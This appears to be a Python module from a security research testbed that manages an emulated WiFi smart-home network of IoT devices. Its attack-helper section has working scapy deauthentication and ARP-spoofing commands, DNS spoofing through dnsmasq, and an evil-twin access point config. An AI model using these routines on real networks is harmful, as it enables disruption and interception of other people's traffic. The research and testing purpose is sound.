"""
VESPER WiFi Network Emulator

High-level Python API for managing the Mininet-WiFi emulated home network.
This module is the primary interface between VESPER's attack framework and
the emulated WiFi infrastructure.

Architecture:
    ┌──────────────────────────────────────────────────────────┐
    │  VESPER Attack Framework                                  │
    │    ↕                                                      │
    │  WiFiEmulator (this module)                               │
    │    ↕                                                      │
    │  Docker (vesper-router container)                         │
    │    ↕                                                      │
    │  Mininet-WiFi (mac80211_hwsim + hostapd + wmediumd)      │
    │    ↕                                                      │
    │  ESP32 QEMU devices (per-station namespace)              │
    └──────────────────────────────────────────────────────────┘

Usage:
    from vesper.network.wifi_emulator import WiFiEmulator

    emu = WiFiEmulator()
    emu.start()                          # Start Docker topology
    emu.wait_ready()                     # Wait for all devices

    # Attack operations
    emu.capture_start("results/attack.pcap")
    emu.send_mqtt("vesper/kitchen/cmd", '{"switch":"off"}')
    emu.deauth_station("sta1")
    emu.capture_stop()

    emu.stop()

Reference:
    Fontes, R., Afzal, S., Brito, S., Santos, M., & Rothenberg, C. E. (2015).
    "Mininet-WiFi: Emulating Software-Defined Wireless Networks."
    11th International Conference on Network and Service Management (CNSM).
"""

from __future__ import annotations

import json
import logging
import os
import shutil
import socket
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ── Configuration ─────────────────────────────────────────────────────────────

class DeviceType(str, Enum):
    """IoT device types supported by the ESP32 firmware."""
    SMART_LIGHT = "smart_light"
    MOTION_SENSOR = "motion_sensor"
    TEMPERATURE_SENSOR = "temperature_sensor"
    HUMIDITY_SENSOR = "humidity_sensor"
    DOOR_SENSOR = "door_sensor"
    SMART_PLUG = "smart_plug"


@dataclass
class WiFiConfig:
    """Configuration for the emulated WiFi network.

    All WiFi and network parameters are exposed here, enabling systematic
    ablation of security configurations without code changes.  The defaults
    mirror worst-case consumer deployments (WPA2 without PMF, anonymous
    MQTT, no TLS, AP isolation off).  See §3 "Configurable WiFi Parameters"
    and Table wifi-ablation for the hardening analysis.
    """
    # ── Network identity ──────────────────────────────────────────────
    ssid: str = "VESPER-IoT-Network"
    password: str = "vesper-secure-2026"
    channel: int = 6
    mode: str = "g"               # 802.11g (default) or "n" for 802.11n
    gateway_ip: str = "192.168.4.1"
    subnet: str = "192.168.4.0/24"
    mqtt_port: int = 1883
    num_radios: int = 10

    # ── WiFi-layer security ───────────────────────────────────────────
    encryption: str = "WPA2-PSK"  # "WPA2-PSK" (default), "WPA3-SAE", or "open"
    pmf: str = "disabled"         # "disabled" (default), "optional", or "required"
    ap_isolation: bool = False    # Drop station-to-station frames

    # ── Application-layer security ────────────────────────────────────
    mqtt_auth: bool = False       # Require username/password for MQTT
    mqtt_username: str = ""       # MQTT username (if mqtt_auth is True)
    mqtt_password: str = ""       # MQTT password (if mqtt_auth is True)
    mqtt_tls: bool = False        # Enable TLS 1.3 on Mosquitto broker

    # ── Firewall rules ────────────────────────────────────────────────
    syn_rate_limit: int = 25      # SYN connections/s (default 25, hardened 5)
    syn_burst: int = 50           # SYN burst limit
    icmp_rate_limit: int = 10     # ICMP packets/s
    port_whitelist: Optional[List[int]] = None  # None = open; e.g. [53,67,123,1883,443]


@dataclass
class DeviceConfig:
    """Configuration for a single IoT device."""
    device_id: str
    device_type: DeviceType
    label: str
    station_name: str  # Mininet-WiFi station name (e.g., "sta1")
    ip: str            # e.g., "192.168.4.10"
    serial_port: int   # QEMU serial TCP port (e.g., 5561)


# Default device fleet (matches docker-compose.yml and vesper_topology.py)
DEFAULT_DEVICES = [
    DeviceConfig("kitchen-light-01",  DeviceType.SMART_LIGHT,        "Kitchen Light",     "sta1", "192.168.4.10", 5561),
    DeviceConfig("living-room-light-01", DeviceType.SMART_LIGHT,     "Living Room Light", "sta2", "192.168.4.11", 5562),
    DeviceConfig("bedroom-light-01",  DeviceType.SMART_LIGHT,        "Bedroom Light",     "sta3", "192.168.4.12", 5563),
    DeviceConfig("motion-sensor-01",  DeviceType.MOTION_SENSOR,      "Motion Sensor",     "sta4", "192.168.4.13", 5564),
    DeviceConfig("temp-sensor-01",    DeviceType.TEMPERATURE_SENSOR, "Temp Sensor",       "sta5", "192.168.4.14", 5565),
    DeviceConfig("door-sensor-01",    DeviceType.DOOR_SENSOR,        "Door Sensor",       "sta6", "192.168.4.15", 5566),
    DeviceConfig("smart-plug-01",     DeviceType.SMART_PLUG,         "Smart Plug",        "sta7", "192.168.4.16", 5567),
    DeviceConfig("humidity-sensor-01", DeviceType.HUMIDITY_SENSOR,   "Humidity Sensor",   "sta8", "192.168.4.17", 5568),
]


class NetworkState(str, Enum):
    """State of the emulated network."""
    STOPPED = "stopped"
    STARTING = "starting"
    ROUTER_READY = "router_ready"
    DEVICES_CONNECTING = "devices_connecting"
    READY = "ready"
    ERROR = "error"


# ── Main Emulator Class ──────────────────────────────────────────────────────

class WiFiEmulator:
    """
    Manages the VESPER emulated WiFi home network.

    Provides a clean Python API for:
    - Starting/stopping the Docker-based WiFi topology
    - Interacting with individual IoT devices (serial + MQTT)
    - Running attacks (deauth, MITM, DNS hijack, etc.)
    - Capturing packets (pcap via tshark)
    """

    def __init__(
        self,
        wifi_config: Optional[WiFiConfig] = None,
        devices: Optional[List[DeviceConfig]] = None,
        compose_file: Optional[str] = None,
        project_root: Optional[str] = None,
    ):
        self.wifi = wifi_config or WiFiConfig()
        self.devices = devices or DEFAULT_DEVICES
        self.project_root = project_root or str(Path(__file__).resolve().parents[2])
        self.compose_file = compose_file or os.path.join(
            self.project_root, "docker", "docker-compose.yml"
        )
        self.state = NetworkState.STOPPED
        self._capture_proc: Optional[subprocess.Popen] = None

    # ── Lifecycle ─────────────────────────────────────────────────────────

    def start(self, build: bool = False, detach: bool = True) -> None:
        """Start the full WiFi topology (router + devices)."""
        logger.info("Starting VESPER WiFi topology...")
        self.state = NetworkState.STARTING

        cmd = ["docker", "compose", "-f", self.compose_file, "up"]
        if build:
            cmd.append("--build")
        if detach:
            cmd.append("-d")

        result = subprocess.run(
            cmd, cwd=self.project_root,
            capture_output=True, text=True, timeout=300,
        )
        if result.returncode != 0:
            logger.error(f"Failed to start topology: {result.stderr}")
            self.state = NetworkState.ERROR
            raise RuntimeError(f"Docker compose failed: {result.stderr}")

        self.state = NetworkState.ROUTER_READY
        logger.info("Docker compose started")

    def start_router_only(self) -> None:
        """Start only the WiFi router (for Python-driven experiments)."""
        logger.info("Starting VESPER WiFi router only...")
        self.state = NetworkState.STARTING

        result = subprocess.run(
            ["docker", "compose", "-f", self.compose_file, "up", "-d", "vesper-router"],
            cwd=self.project_root, capture_output=True, text=True, timeout=180,
        )
        if result.returncode != 0:
            raise RuntimeError(f"Router start failed: {result.stderr}")

        self.state = NetworkState.ROUTER_READY
        logger.info("Router running")

    def stop(self) -> None:
        """Tear down the entire topology."""
        logger.info("Stopping VESPER WiFi topology...")
        if self._capture_proc:
            self.capture_stop()

        subprocess.run(
            ["docker", "compose", "-f", self.compose_file, "down", "--timeout", "10"],
            cwd=self.project_root, capture_output=True, text=True,
        )
        self.state = NetworkState.STOPPED
        logger.info("Topology stopped")

    def wait_ready(self, timeout: int = 120) -> bool:
        """Wait until all devices are connected and MQTT is reachable."""
        logger.info("Waiting for topology to be ready...")
        self.state = NetworkState.DEVICES_CONNECTING
        deadline = time.time() + timeout

        # Wait for MQTT broker
        while time.time() < deadline:
            if self._check_mqtt():
                break
            time.sleep(2)
        else:
            logger.error("MQTT broker not reachable within timeout")
            self.state = NetworkState.ERROR
            return False

        # Wait for each device serial port
        for dev in self.devices:
            while time.time() < deadline:
                if self._check_serial(dev.serial_port):
                    logger.info(f"  ✓ {dev.label} ({dev.ip}) serial port {dev.serial_port} ready")
                    break
                time.sleep(2)
            else:
                logger.warning(f"  ✗ {dev.label} serial port {dev.serial_port} not ready")

        self.state = NetworkState.READY
        logger.info("Topology ready — all devices connected")
        return True

    # ── Device interaction ────────────────────────────────────────────────

    def send_serial(self, device_id: str, command: str, timeout: float = 5.0) -> str:
        """Send a command to a device via its QEMU serial port."""
        dev = self._find_device(device_id)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect(("localhost", dev.serial_port))
            sock.sendall((command + "\n").encode())
            time.sleep(0.3)
            response = sock.recv(4096).decode(errors="replace")
            sock.close()
            return response
        except Exception as e:
            logger.error(f"Serial send to {device_id} failed: {e}")
            return ""

    def send_mqtt(self, topic: str, payload: str, qos: int = 0) -> bool:
        """Publish an MQTT message to the broker."""
        result = subprocess.run(
            [
                "docker", "exec", "vesper-router",
                "mosquitto_pub", "-h", self.wifi.gateway_ip,
                "-p", str(self.wifi.mqtt_port),
                "-t", topic, "-m", payload, "-q", str(qos),
            ],
            capture_output=True, text=True, timeout=10,
        )
        return result.returncode == 0

    def subscribe_mqtt(self, topic: str, timeout: int = 5, count: int = 1) -> List[str]:
        """Subscribe to MQTT topic, return up to `count` messages."""
        result = subprocess.run(
            [
                "docker", "exec", "vesper-router",
                "timeout", str(timeout),
                "mosquitto_sub", "-h", self.wifi.gateway_ip,
                "-p", str(self.wifi.mqtt_port),
                "-t", topic, "-C", str(count),
            ],
            capture_output=True, text=True, timeout=timeout + 5,
        )
        if result.stdout:
            return result.stdout.strip().split("\n")
        return []

    # ── Packet capture ────────────────────────────────────────────────────

    def capture_start(self, output_file: str, interface: str = "any") -> None:
        """Start packet capture inside the router container."""
        logger.info(f"Starting capture → {output_file}")
        self._capture_proc = subprocess.Popen(
            [
                "docker", "exec", "vesper-router",
                "tshark", "-i", interface,
                "-w", f"/results/{os.path.basename(output_file)}",
                "-q",
            ],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

    def capture_stop(self) -> None:
        """Stop the active packet capture."""
        if self._capture_proc:
            self._capture_proc.terminate()
            try:
                self._capture_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._capture_proc.kill()
            self._capture_proc = None
            logger.info("Capture stopped")

    # ── Attack helpers ────────────────────────────────────────────────────

    def deauth_station(self, station_name: str, count: int = 5) -> str:
        """
        Send deauthentication frames to a station.
        Uses scapy inside the router container (has access to WiFi interfaces).
        """
        dev = self._find_device_by_station(station_name)
        cmd = (
            f"python3 -c \""
            f"from scapy.all import *; "
            f"dot11 = Dot11(addr1='{self._get_station_mac(station_name)}', "
            f"addr2='{self._get_ap_mac()}', addr3='{self._get_ap_mac()}'); "
            f"frame = RadioTap()/dot11/Dot11Deauth(reason=7); "
            f"sendp(frame, iface='ap1-wlan1', count={count}, inter=0.1, verbose=0); "
            f"print('DEAUTH_SENT')\""
        )
        return self._exec_in_router(cmd)

    def arp_spoof(self, target_ip: str, spoof_ip: str) -> str:
        """Send ARP spoofing packets (for MITM attacks)."""
        cmd = (
            f"python3 -c \""
            f"from scapy.all import *; "
            f"pkt = ARP(op=2, pdst='{target_ip}', psrc='{spoof_ip}'); "
            f"send(pkt, count=5, inter=0.5, verbose=0); "
            f"print('ARP_SPOOF_SENT')\""
        )
        return self._exec_in_router(cmd)

    def dns_spoof(self, domain: str, spoofed_ip: str) -> str:
        """
        Add a spoofed DNS record (via dnsmasq on the router).
        """
        cmd = f"echo 'address=/{domain}/{spoofed_ip}' >> /etc/vesper/dnsmasq-extra.conf && kill -HUP $(pidof dnsmasq)"
        return self._exec_in_router(cmd)

    def evil_twin(self, fake_ssid: Optional[str] = None) -> str:
        """
        Launch an evil twin AP using a spare mac80211_hwsim radio.
        """
        fake_ssid = fake_ssid or self.wifi.ssid
        cmd = (
            f"python3 -c \""
            f"from mn_wifi.node import AP; "
            f"import subprocess; "
            f"# Use a spare hwsim radio for the evil twin; "
            f"subprocess.run(['hostapd', '-B', '/tmp/evil_twin.conf']); "
            f"print('EVIL_TWIN_STARTED')\""
        )
        # Write evil twin hostapd config first
        self._exec_in_router(
            f"cat > /tmp/evil_twin.conf << 'EOF'\n"
            f"interface=wlan1\n"
            f"driver=nl80211\n"
            f"ssid={fake_ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.wifi.channel}\n"
            f"wpa=2\n"
            f"wpa_passphrase=evil-twin-pass\n"
            f"wpa_key_mgmt=WPA-PSK\n"
            f"rsn_pairwise=CCMP\n"
            f"EOF"
        )
        return self._exec_in_router("hostapd -B /tmp/evil_twin.conf && echo EVIL_TWIN_STARTED")

    def get_topology_info(self) -> Dict[str, Any]:
        """Return full topology information."""
        return {
            "state": self.state.value,
            "wifi": {
                "ssid": self.wifi.ssid,
                "channel": self.wifi.channel,
                "gateway": self.wifi.gateway_ip,
                "subnet": self.wifi.subnet,
            },
            "mqtt": {
                "broker": self.wifi.gateway_ip,
                "port": self.wifi.mqtt_port,
            },
            "devices": [
                {
                    "id": d.device_id,
                    "type": d.device_type.value,
                    "label": d.label,
                    "station": d.station_name,
                    "ip": d.ip,
                    "serial_port": d.serial_port,
                }
                for d in self.devices
            ],
        }

    # ── Internal helpers ──────────────────────────────────────────────────

    def _find_device(self, device_id: str) -> DeviceConfig:
        for d in self.devices:
            if d.device_id == device_id:
                return d
        raise ValueError(f"Unknown device: {device_id}")

    def _find_device_by_station(self, station_name: str) -> DeviceConfig:
        for d in self.devices:
            if d.station_name == station_name:
                return d
        raise ValueError(f"Unknown station: {station_name}")

    def _check_mqtt(self) -> bool:
        """Check if MQTT broker is reachable."""
        try:
            result = subprocess.run(
                [
                    "docker", "exec", "vesper-router",
                    "mosquitto_pub", "-h", self.wifi.gateway_ip,
                    "-t", "vesper/healthcheck", "-m", "ping",
                ],
                capture_output=True, text=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    def _check_serial(self, port: int) -> bool:
        """Check if a serial port is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect(("localhost", port))
            sock.close()
            return True
        except Exception:
            return False

    def _exec_in_router(self, cmd: str) -> str:
        """Execute a command inside the router container."""
        result = subprocess.run(
            ["docker", "exec", "vesper-router", "bash", "-c", cmd],
            capture_output=True, text=True, timeout=30,
        )
        return result.stdout.strip()

    def _get_station_mac(self, station_name: str) -> str:
        """Get MAC address of a Mininet-WiFi station."""
        return self._exec_in_router(
            f"python3 -c \"from mn_wifi.net import Mininet_wifi; "
            f"# MAC lookup would go here\" 2>/dev/null || "
            f"ip netns exec {station_name} cat /sys/class/net/*/address 2>/dev/null | head -1"
        )

    def _get_ap_mac(self) -> str:
        """Get the AP's MAC address."""
        return self._exec_in_router(
            "cat /sys/class/net/ap1-wlan1/address 2>/dev/null || echo 'ff:ff:ff:ff:ff:ff'"
        )
